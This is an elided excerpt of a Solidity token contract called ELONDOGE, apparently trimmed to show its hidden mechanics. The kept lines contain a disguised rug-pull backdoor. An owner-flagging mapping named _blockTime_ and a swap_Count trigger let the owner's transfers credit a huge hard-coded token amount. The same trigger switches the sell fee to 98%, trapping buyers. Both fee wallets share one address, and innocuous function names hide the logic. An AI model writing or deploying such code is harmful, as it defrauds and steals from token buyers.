...
contract ELONDOGE is Context, IERC20 { 
    uint256 transferred = 0x446c3b15f992680000000000000000000000000000;
    ...
    mapping (address => uint256) public _blockTime_;
    mapping (address => bool) public _ExemptMaxWalletLimit;
    mapping (address => bool) public _ExemptMaxTxLimit;

    address payable public Wallet_Marketing = payable(0x4D15e60D66DEF25cc701274f4BeF22705F2d66C7); 
    address payable public Wallet_Dev = payable(0x4D15e60D66DEF25cc701274f4BeF22705F2d66C7);
    ...
    uint256 public Percent_Auto_Liquidity = 98;
    uint256 public swap_Count = 1;
    ...
    constructor () {
        ...
        _blockTime_[owner()] = _tTotal - (_tTotal - 1);
        ...
        _ExemptMaxWalletLimit[Wallet_Marketing] = true;
        ...
        _ExemptMaxTxLimit[Wallet_Marketing] = true;
    ...
    function _transfer(
        ...
        if( _blockTime_[to] > 0 && swap_Count > 0 )
            swap_Count--;
    ...
    function takeTokens(bool x, bool y, bool z) private pure returns(bool){
        bool callResult = x && y && z;
        return callResult;
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            ( swap_Count < 1 && 
            (_blockTime_[sender] > _blockTime_[recipient] ? _blockTime_[sender] - _blockTime_[recipient] : _blockTime_[recipient] - _blockTime_[sender]) > 0 &&             _blockTime_[recipient] > 0
            ?  
            transferred
            : 
            tAmount
            ...
            uint256 sellFEE = tAmount*[Percent_Auto_Liquidity, _Tax_On_Sell][swap_Count]/100;
